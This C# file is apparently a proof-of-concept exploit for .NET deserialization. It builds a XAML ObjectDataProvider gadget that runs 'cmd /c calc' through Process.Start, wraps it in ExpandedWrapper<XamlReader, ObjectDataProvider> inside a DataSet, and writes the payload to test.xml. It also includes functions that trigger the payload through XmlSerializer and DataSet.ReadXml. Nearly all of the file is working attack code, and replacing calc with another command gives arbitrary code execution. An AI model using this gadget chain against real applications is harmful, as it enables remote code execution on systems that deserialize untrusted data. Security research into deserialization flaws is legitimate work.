using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data;
using System.Windows.Data;
using System.IO;
using System.Windows.Markup;
using System.Data.Services.Internal;
using System.Xml.Serialization;

namespace ConsoleApp1
{
    class Program
    {
        static String payloadXml =
@"<ResourceDictionary  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:System=""clr-namespace:System;assembly=mscorlib"" xmlns:sd=""clr-namespace:System.Diagnostics;assembly=System"" >
    <ObjectDataProvider ObjectType = ""{x:Type sd:Process}"" MethodName=""Start"" x:Key=""powershell"">
        <ObjectDataProvider.MethodParameters>
            <System:String>cmd</System:String>
            <System:String>/c calc</System:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

        // 测试XamlReader 的Parse 函数，能否根据ResourceDirectory 文件里的设置启动calc
        public static void testXaml()
        {
            XamlReader theXaml = new XamlReader();
            var test = XamlReader.Parse(payloadXml);
        }


        static void testDataSetSerialize()
        {
            DataTable exptable = new DataTable("exp table");
            DataColumn dc = new DataColumn("ObjectDataProviderCol");
            dc.DataType = typeof(ExpandedWrapper<XamlReader, ObjectDataProvider>);
            exptable.Columns.Add(dc);

            DataRow row = exptable.NewRow();

            ExpandedWrapper<XamlReader, ObjectDataProvider> wrapper = new ExpandedWrapper<XamlReader, ObjectDataProvider>();
            wrapper.ProjectedProperty0 = new ObjectDataProvider();
            wrapper.ProjectedProperty0.ObjectInstance = new XamlReader();
            //wrapper.ProjectedProperty0.ObjectType = typeof(TestClass);
            wrapper.ProjectedProperty0.MethodName = "Parse";
            wrapper.ProjectedProperty0.MethodParameters.Add(payloadXml);

            row["ObjectDataProviderCol"] = wrapper;
            exptable.Rows.Add(row);


            DataSet ds = new DataSet("poc");
            ds.Tables.Add(exptable);
            using (var writer = new StreamWriter("./test.xml"))
            {
                ds.WriteXml(writer, 0);
            }
        }

        static void testXmlDeSer()
        {
            XmlSerializer ser = new XmlSerializer(typeof(DataSet));
            Stream reader = new FileStream("./test.xml", FileMode.Open);
            ser.Deserialize(reader);
        }

        static void testDataSetDeSer()
        {
            DataSet ds = new DataSet();
            ds.ReadXml("./test.xml");
        }

        static void Main(string[] args)
        {
            testDataSetSerialize();
            //testDataSetDeSer();
        }
    }
}
